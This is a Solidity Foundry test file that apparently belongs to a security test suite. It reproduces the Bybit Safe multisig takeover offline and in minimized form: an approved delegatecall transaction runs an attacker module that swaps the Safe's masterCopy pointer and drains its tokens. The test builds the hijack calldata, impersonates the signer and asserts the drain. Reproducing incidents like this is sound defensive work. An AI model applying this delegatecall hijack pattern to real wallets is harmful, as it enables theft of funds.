// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Test, console} from "forge-std/Test.sol";
import {MockERC20} from "../src/MockERC20.sol";
import {BybitSafeClone} from "../fixtures/delegatecall-hijack/b-incident/BybitSafeClone.sol";
import {AccountTakeoverModule} from "../src/AccountTakeoverModule.sol";

/// @title delegatecall-hijack tier (b): Bybit Safe multisig takeover (2025-02-21, ~$1.46B).
/// @notice Minimized offline reproduction of the documented mechanism: the Safe signers
///         approved a transaction whose `operation` flag was delegatecall (1) rather than
///         call (0). The payload ran attacker code in the Safe's storage context, which
///         overwrote the `masterCopy` logic pointer and swept the balance - whole-account
///         takeover. Mechanism-level (root cause was a Safe{Wallet} front-end compromise,
///         not a contract bug; full calldata/traces were not all public). The verdict is
///         derived from the real outcome: masterCopy replaced and funds gone.
contract BybitIncidentTest is Test {
    uint256 constant COLD_WALLET_BALANCE = 401_000e18; // representative, scaled
    address constant ATTACKER = address(0xBAD11);
    address constant ORIG_MASTERCOPY = address(0x5AFE); // the legitimate Safe singleton
    address constant SIGNER = address(0x516E); // the approving owner (threshold minimized)

    function _report(string memory target, bool hijacked) internal pure {
        string memory verdict = hijacked ? "VULNERABLE" : "BLOCKED";
        console.log(string.concat("[delegatecall-hijack] target=", target, " verdict=", verdict));
    }

    function test_bybitSafe_delegatecallSwap_takesOverAccount() public {
        MockERC20 token = new MockERC20();
        BybitSafeClone safeWallet = new BybitSafeClone(ORIG_MASTERCOPY, SIGNER);
        AccountTakeoverModule module = new AccountTakeoverModule();
        token.mint(address(safeWallet), COLD_WALLET_BALANCE);

        // Signers believed they approved a benign transfer; the submitted payload had
        // operation = 1 (delegatecall) targeting the attacker module. The approving owner
        // submits it (signatures were obtained - the incident did not break signing).
        bytes memory data =
            abi.encodeWithSignature("hijack(address,address,address)", ATTACKER, address(token), ATTACKER);
        vm.prank(SIGNER);
        safeWallet.execTransaction(address(module), data, 1);

        bool masterCopySwapped = (safeWallet.masterCopy() != ORIG_MASTERCOPY);
        bool drained = (token.balanceOf(address(safeWallet)) == 0);
        bool hijacked = masterCopySwapped && drained;
        _report("bybit-exec-victim", hijacked);

        assertTrue(hijacked, "delegatecall-swap should take over the Safe");
        assertEq(safeWallet.masterCopy(), ATTACKER, "masterCopy/logic pointer replaced by attacker");
        assertEq(token.balanceOf(ATTACKER), COLD_WALLET_BALANCE, "attacker drained the cold wallet");
    }
}
